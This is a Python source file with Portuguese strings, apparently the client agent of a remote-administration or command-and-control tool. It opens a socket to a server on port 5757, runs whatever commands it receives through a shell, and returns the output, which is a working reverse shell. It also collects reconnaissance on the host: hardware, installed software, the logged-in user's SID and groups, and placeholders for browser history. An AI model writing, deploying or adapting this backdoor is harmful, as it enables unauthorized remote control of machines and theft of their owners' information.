import socket
import subprocess
import os
import platform
from browser_history.browsers import Chrome, Edge, Firefox

def connect_to_server():
    server_host = '0.0.0.0'
    server_port = 5757  
    
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((server_host, server_port))

    while True:
        command = client.recv(1024).decode('utf-8')
        if command == 'exit':
            break    
        try:
            output = subprocess.check_output(command, shell=True)
        except subprocess.CalledProcessError as e:
            output = str(e.output)
        client.send(output)

        msg = client.recv(1024).decode('utf-8')
        if msg.strip() == '':
            print('\nNão foi possível permanecer conectado no servidor!\n')
            client.close()
            return
        try:
            if platform.system() == 'Windows':
                function_output = criar_respostaW(msg)
            else:
                function_output = criar_respostaL(msg)
        except Exception as e: 
            print(f"Erro: {e}")
            function_output = 'Erro ao executar o comando'

        print(function_output)
        client.send(f'{function_output}'.encode('utf-8'))

    client.close()

def criar_respostaW(comando):
    dictopcoes = {
        '/info_h': informacoes_hardwareW(),
        '/info_p': lista_programas_instaladosW(),
        '/info_u': informacoes_usuario_logadoW(),
        '/historic': historico_navegacaoW(),
        '/listclient': lista_agentes_onlineW()
    }

    try:
        return dictopcoes[comando]
    except: 
        return 'comando inválido'


def criar_respostaL(comando):
    dictopcoes = {
        '/info_h': informacoes_hardwareL(),
        '/info_p': lista_programas_instaladosL(),
        '/info_u': informacoes_usuario_logadoL(),
        '/historic': historico_navegacaoL(),
        '/listclient': lista_agentes_onlineL()
    }

    try:
        return dictopcoes[comando]
    except: 
        return 'comando inválido'


# LINUX

def informacoes_hardwareL():
    informacoes = infohardwareL()
    return informacoes 

def lista_programas_instaladosL():
    informacoes = proglinux()
    return informacoes

def historico_navegacaoL():
    return "Histórico de navegação em diferentes navegadores."

def informacoes_usuario_logadoL():
    informacoes = infouserL()
    return informacoes

def lista_agentes_onlineL():
    return "Lista dos agentes online com informações básicas."


# WINDOWS
def informacoes_hardwareW():
    return infohardwareW()

def lista_programas_instaladosW():
    return progwindows()

def historico_navegacaoW():
    return 'históricos de navegação'

def informacoes_usuario_logadoW():
    return infouserW()

def lista_agentes_onlineW():
    return "Lista dos agentes online com informações básicas."


def infohardwareW():
    def memoria_windows():
        try:
            resultado = subprocess.run(['systeminfo'], capture_output=True, text=True)
            systeminfo = resultado.stdout
            memoria_total = [linha for linha in systeminfo.split('\n') if 'Memória física total:' in linha]
            total = memoria_total[0].split(':')[-1].strip()
            memoria_dis = [linha for linha in systeminfo.split('\n') if 'Memória física disponível:' in linha]
            disponivel = memoria_dis[0].split(':')[-1].strip()

            final = f"Memória Total: {total}\nMemória Disponível: {disponivel}"
            return final
        except:
            return "Não foi possível receber a informação de memória"

    def disco_windows():
        try:
            resultado = subprocess.run(['wmic', 'logicaldisk', 'get', 'size,freespace,caption'], capture_output=True, text=True)
            linhas = resultado.stdout.strip().split('\n')
            dados = linhas[2].split()
            vazio = int(dados[1]) / (1024 ** 3)
            total = int(dados[2]) / (1024 ** 3)

            informacoes_discos = f"Espaço livre em disco: {vazio:.2f} GB\nEspaço total em disco: {total:.2f} GB"
            return informacoes_discos
        except:
            return "Não foi possível receber a informação de disco"

    try:
        sistema_operacional = platform.system()
        processador = platform.processor()
        arquitetura = platform.architecture()
    except:
        return 'Não foi possível obter as informações de Hardware'

    informacoes = (
        f"\n----- INFORMAÇÕES DE CPU -----\n"
        f"Sistema Operacional: {sistema_operacional}\n"
        f"Processador: {processador}\n"
        f"Arquitetura: {arquitetura[0]} {arquitetura[1]}\n"
        f"\n----- INFORMAÇÕES DE DISCO -----\n{disco_windows()}\n"
        f"\n----- INFORMAÇÕES DE MEMÓRIA -----\n{memoria_windows()}"
    )

    return informacoes

def infouserW():
    def gruposusuariowin():
        try:
            resultado = subprocess.run(['net', 'user', os.getlogin()], capture_output=True, text=True, encoding='cp437')
            linhas = resultado.stdout.strip().splitlines()

            imprimir = False
            inicio = 'Associações de Grupo Local'
            fim = 'Comando concluído com êxito.'
            informações = ""

            for linha in linhas:
                if fim in linha:
                    break
                if inicio in linha:
                    imprimir = True
                if imprimir:
                    linha = linha.replace('Associações', 'Associações')
                    informações += linha + '\n'
            return informações
        except:
            return 'Não foi possível obter as informações do Agente'

    def usersid():
        try:    
            sid = None
            out = subprocess.Popen("wmic useraccount get name, sid", stdout=subprocess.PIPE)
            out = out.communicate()[0].decode().replace("\r", "")
            for line in out.split("\n"):
                if line.startswith(os.getlogin()):        
                    sid = line.replace(os.getlogin(), "").strip()
                    return sid
                
        except Exception as e:
            print(f'Erro: {e}')
            return 'Não foi possível obter as informações do SID do Agente'
    
    usuario = os.getlogin()
    informacoes_usuario = f'''
    ---------------- INFORMAÇÕES DE USUÁRIO ----------------

    O Diretório Inicial do Usuário {usuario} é: '{os.environ['USERPROFILE']}'
    O SID do usuário {usuario} é: {usersid()}
    Os grupos que o usuário {usuario} está associado são:
    {gruposusuariowin()}
    Nome do Executável do usuário {usuario} é: {os.path.basename(os.environ['ComSpec'])}
    '''
    return informacoes_usuario

def progwindows():
    try:
        resultado = subprocess.run(['wmic', 'product', 'get', 'name'], capture_output=True, text=True)
        linhas = resultado.stdout.splitlines()
        informacoes = "\n---------- INFORMAÇÕES DE PROGRAMAS INSTALADOS ----------\n\n"
        for linha in linhas[2:-3]:
            informacoes += linha + "\n"

        return informacoes
    except:
        return f'Não foi possível obter as informações de programas instalados:'

def infohardwareL():
    def memoria_linux():
        try:
            cabeçalho = subprocess.run('free | grep "total"', capture_output=True, text=True, shell=True)
            memoria = subprocess.run('free -m | grep "Mem:"', capture_output=True, text=True, shell=True)

            informacoes = f"\nInformações detalhadas sobre a memória física:\n{cabeçalho.stdout}\n{memoria.stdout}"

            return informacoes
        except:
            return f"Erro ao obter informações de memória"

    def disco_linux():
        try:
            cabeçalho = subprocess.run('df -h | grep -i "File"', shell=True, capture_output=True, text=True)
            discos = ["/dev/sda", "/dev/root", "/dev/mapper", "/dev/nvme0n1p1"]

            for disco in discos:
                try:
                    armazenamento = subprocess.run(f'df -h | grep -i "{disco}"', capture_output=True, text=True, shell=True)
                    break
                except: continue 

            informacoes = f"\nInformações detalhadas sobre o disco:\n\n{cabeçalho.stdout}{armazenamento.stdout}"

            return informacoes
        except:
            return f"Erro ao obter informações de disco"

    try:
        sistema_operacional = platform.system()
        processador = platform.processor()
        arquitetura = platform.architecture()
    except:
        return 'Não foi possível obter as informações de Hardware'

    informacoes = (
        f"\n----- INFORMAÇÕES DE CPU -----\n"
        f"Sistema Operacional: {sistema_operacional}\n"
        f"Processador: {processador}\n"
        f"Arquitetura: {arquitetura[0]} {arquitetura[1]}\n"
        f"\n----- INFORMAÇÕES DE DISCO -----\n{disco_linux()}\n"
        f"\n----- INFORMAÇÕES DE MEMÓRIA -----\n{memoria_linux()}"
    )

    return informacoes

def infouserL():
    def grupos_linux():
        try:
            usuario = os.getlogin()
            resultado = subprocess.run(['groups', usuario], capture_output=True, text=True, shell=True)
            grupos = resultado.stdout.strip().split()
            secundarios = ('\n'.join(grupos[3:]))

            saida = f"\n--- Grupo Principal ---\n{grupos[2]}\n\n--- Grupos Secundários ---\n{secundarios}"
            return saida
        except:
            return 'Não foi possível obter as informações de grupos do usuário'

    return (f"Usuário: {os.getlogin()}\n"
        f"Diretório Inicial: {os.path.expanduser('~')}\n"
        f"Identificação de usuário: UID = {os.getuid()}\n"
        f"Os grupos do usuário são: {grupos_linux()}\n"
        f"\nO Shell padrão do Usuário é: {os.environ['SHELL']}")

def proglinux():
    try:
        resultado = subprocess.run(['apt', 'list', '--installed'], capture_output=True, text=True, shell=True)
        linhas = resultado.stdout.splitlines()

        informacoes = "\n---------- INFORMAÇÕES DE PROGRAMAS INSTALADOS ----------\n\n"
        for linha in linhas[2:-3]:
            informacoes += linha + "\n"

        return informacoes
    except:
        return f'Não foi possível obter as informações de programas instalados:'
